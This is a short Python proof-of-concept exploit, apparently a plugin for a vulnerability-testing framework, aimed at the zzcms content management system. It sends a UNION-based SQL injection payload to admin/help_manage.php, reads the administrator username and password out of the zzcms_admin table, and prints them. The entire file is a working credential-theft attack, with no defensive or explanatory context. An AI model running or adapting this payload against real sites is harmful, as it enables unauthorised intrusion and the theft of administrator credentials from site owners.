import re

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("admin/help_manage.php"):
            print(
                "[*] Please make sure the url end with 'admin/help_manage.php'"
            )
            exit()
        payload = {
            "b":
            "-1 UNION ALL SELECT 7983,7983,7983,7983,7983,7983,(SELECT CONCAT(0x757365723a20,IFNULL(CAST(admin AS CHAR),0x20),0x20706173733a2020,IFNULL(CAST(pass AS CHAR),0x20)) FROM zzcms_admin LIMIT 0,1)-- "
        }
        r = requests.get(target.url, params=payload)

        p = '(?<=<td align="center">)(user.*?)(?=</td>)'
        s = re.search(p, r.text)
        print("[*] Get the username and password: " + s.group(0))

    except (KeyError, AttributeError) as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
